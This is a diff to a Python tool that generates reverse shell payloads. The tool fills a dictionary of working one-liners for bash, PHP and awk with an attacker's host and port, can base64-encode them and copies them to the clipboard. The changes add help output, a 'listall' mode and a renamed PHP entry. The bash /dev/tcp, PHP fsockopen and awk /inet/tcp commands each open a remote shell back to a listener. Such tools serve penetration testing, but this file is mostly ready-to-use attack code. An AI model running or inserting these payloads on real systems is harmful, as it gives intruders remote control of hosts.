@@ -1,9 +1,9 @@
 import argparse
+import sys
+import pyperclip
 from base64 import b64encode
 from importlib.util import find_spec
 from urllib.parse import quote
-import sys
-import pyperclip
 
 if not find_spec("pyperclip"):
     print("[!] Looks like you don't have pyperclip installed, it is required to run the script\npip3 install pyperclip")
@@ -11,19 +11,30 @@ if not find_spec("pyperclip"):
 
 available_shells = '| BASH | NC | NCAT | RUSTCAT | PERL | PHP | WINDOWS | POWERSHELL | PYTHON | RUBY | SOCAT | NODEJS | TELNET | ZSH | LUA | GOLANG | AWK |'
 
-parser = argparse.ArgumentParser()
+def usage():
+    print("\n[!] Args with a '*' are optional")
+    print(f"Usage: python3 {sys.argv[0]} -s <shell-type> -lh <lhost> -lp* <lport> -enc*  <encode-type>\n\nAvailable shells:")
+    print(available_shells+"\n")
+    print("To list available revshells add =list")
+    print(f"E.g => python3 {sys.argv[0]} --shell netcat=list\n")
+
+parser = argparse.ArgumentParser(usage=argparse.SUPPRESS,add_help=False)
 parser.add_argument('-lh','--lhost',metavar='')
 parser.add_argument('-lp','--lport',metavar='')
 parser.add_argument('-s','--shell',metavar='')
 parser.add_argument('-enc','--encode',metavar='')
+parser.add_argument('-h','--help',action='store_true')
 args = parser.parse_args()
 
+if args.help:
+    usage()
+    exit(0)
 
 def results(revshell):
     print("[Shell name] -",subgroup)
     print("Your shell =>",revshell)
     pyperclip.copy(revshell)
-    print("[!] Shell copied to clipboard")
+    print("[!] Copied to clipboard")
 
 def encodingTable(command):
     if encode == 'b64' or encode == 'base64':
@@ -62,11 +73,6 @@ def craftingTable(shell):
             return
         idk+=1
 
-def usage():
-    print("\n[!] Args with a '*' are optional")
-    print(f"Usage: python3 {sys.argv[0]} -s <shell-type> -lh <lhost> -lp* <lport> -enc*  <encode-type>\n\nAvailable shells:")
-    print(available_shells)
-
 shells = {
     'bash':{
         '-i':''' sh -i >& /dev/tcp/LHOST/LPORT 0>&1 ''',
@@ -99,7 +105,7 @@ shells = {
         'shell_exec':''' php -r '$sock=fsockopen("LHOST",LPORT);shell_exec("sh <&3 >&3 2>&3");' ''',
         'system':''' php -r '$sock=fsockopen("LHOST",LPORT);system("sh <&3 >&3 2>&3");' ''',
         'passthru': ''' php -r '$sock=fsockopen("LHOST",LPORT);passthru("sh <&3 >&3 2>&3");' ''',
-        '`':''' php -r '$sock=fsockopen("LHOST",LPORT);`sh <&3 >&3 2>&3`;' ''',
+        'idk':''' php -r '$sock=fsockopen("LHOST",LPORT);`sh <&3 >&3 2>&3`;' ''',
         'popen':''' php -r '$sock=fsockopen("LHOST",LPORT);popen("sh <&3 >&3 2>&3", "r");' ''',
         'proc_open':''' php -r '$sock=fsockopen("LHOST",LPORT);$proc=proc_open("sh", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);' '''
     },
@@ -147,11 +153,20 @@ shells = {
         '1':''' awk 'BEGIN {s = "/inet/tcp/0/LHOST/LPORT"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null '''
     }
 }
+
 if not args.shell and not args.lhost:
     usage()
     exit(0)
     
 shell = args.shell.lower()
+
+if shell == 'listall':
+    for i in shells:
+        print("===",i,"==="+"\n")
+        for x in shells[i]:
+            print(x+":\n"+shells[i][x])
+        print("\n")
+    exit(0)
 
 if "netcat" in shell:
     shell = shell.replace("netcat","nc")
@@ -165,9 +180,12 @@ if '=' in shell:
     subgroup = shell.split('=')[1]
     shell = shell.split('=')[0]
     if subgroup == 'list':
-        print(f"Shells for {shell}")
+        print(f"|Shells for {shell}|\n")
         for i in shells[shell]:
-            print(f"Name: {i} Shell: {shells[shell][i]}")
+            print(f"{i}:\n{shells[shell][i]}\n")
+        exit(0)
+    if subgroup not in shells[shell]:
+        print(f"[!] There isn't any {shell} revshell called {subgroup}")
         exit(0)
 
 if not args.lhost:
